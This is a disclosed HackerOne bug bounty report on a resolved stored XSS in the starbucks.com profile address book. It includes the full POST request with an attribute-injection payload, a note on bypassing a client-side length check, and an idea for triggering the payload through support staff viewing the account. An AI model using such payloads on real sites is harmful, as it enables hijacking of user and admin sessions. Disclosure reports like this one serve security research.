---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '186554'
original_report_id: '186554'
title: Stored XSS in Adress Book (starbucks.com/account/profile)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2016-11-29T20:26:01.316Z'
disclosed_at: '2017-05-31T20:05:38.316Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
asset_identifier: www.starbucks.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Stored XSS in Adress Book (starbucks.com/account/profile)

## Metadata

- HackerOne Report ID: 186554
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2017-05-31T20:05:38.316Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

I just found a stored XSS in the "Adress book menu" of a user's profile : https://www.starbucks.com/account/profile

# Description :

XSS is happening due to the lack of filtering on the **Address.FirstName** parameter when you POST a new address on the URL : https://www.starbucks.com/account/profile/AddressSave :

{F138388}
{F138390}

Here are the POST Parameters to reproduce the issue:

{F138394}

```
Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=9901231093&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.VerificationStatus=Override&IsAddress=true&__RequestVerificationToken=MDSbXzmn-5j18ck06PpT7Og05zgwOzgq8FMwiqTXIeUfcfRS-keyp9i_x0VbBaIfvUo7EhzYGMvvzPUc0WG5QqlG_YathJ80lgs-p3PCoyNfdvo_E-XY6JfoC9R4tPir0
```

It was quite tricky to leveraged.
Indeed :
- It looks like no parameter from this request is filtered. However, except **Address.FirstName**, they are printed are inside an HTML tag and you prevented the opening of a new tag by blocking anything with "<." (where the point can be anything of course)
- The maximum length of each field (15 characters) is only checked client-side, though short XSS exists
- That is why my final payload is :

**z" onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">**

Here is the email of my account if you can check by yourself: *██████*

# Risks
I assume that you perfectly know the risks of an XSS. 
This one presents a high/critical risk as my addresses can, I think, be seen in the admin panel. I just have to contact the Customer Support for them to look at my account and trigger the XSS.


#Remediation
I also assume that you know how to correct XSS properly as it looks like it is well done elsewhere on the website.


Best regards,

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
